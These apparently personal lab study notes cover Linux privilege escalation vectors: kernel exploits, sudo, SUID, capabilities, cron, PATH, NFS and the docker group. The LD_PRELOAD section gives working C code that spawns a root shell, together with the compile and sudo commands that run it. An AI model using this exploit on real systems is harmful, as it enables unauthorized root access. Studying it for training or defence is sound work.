## Kernel Exploits
The Kernel exploit methodology is simple;
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit
## Sudo 
Any user can check its current situation related to root privileges using the `sudo -l` command.
**Leverage LD_PRELOAD**
On some systems, you may see the LD_PRELOAD environment option.
LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD.
If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.  

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
We need to run the program by specifying the LD_PRELOAD option, as follows;
`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
Example:
``` shell
saad@ip-10-201-80-205:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on ip-10-201-80-205:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-201-80-205:
    (root) /usr/bin/ping
```
In this example we have user `saad`has the env_keep option for LD_PRELOAD, and can run `/usr/bin/ping` as sudo. To exploit this misconfiguration we can create the share object file that can get us a root shell:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```
Then we compile this C code into a share library:
```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
Finally, we execute the command by specifying the LD_PRELOAD option:
```shell
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

## SUID
Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.  
  
You will notice these files have an “s” bit set showing their special permission level.  
  
`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.
## Capabilities
Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. We can use the `getcap` tool to list enabled capabilities.
When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.
## Cron Jobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.
Any user can read the file keeping system-wide cron jobs under `/etc/crontab`.
## PATH
PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the [[shell]] or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).
## NFS
NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
The critical element for this privilege escalation vector is the “no_root_squash” option. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system
## Lessons Learned
**Wildcard injections**: When command runs with `*` it might mean it's vulnerable to a wildcard injection.
**Docker group**: When a user is in the docker group you can get root. See GTFObins.
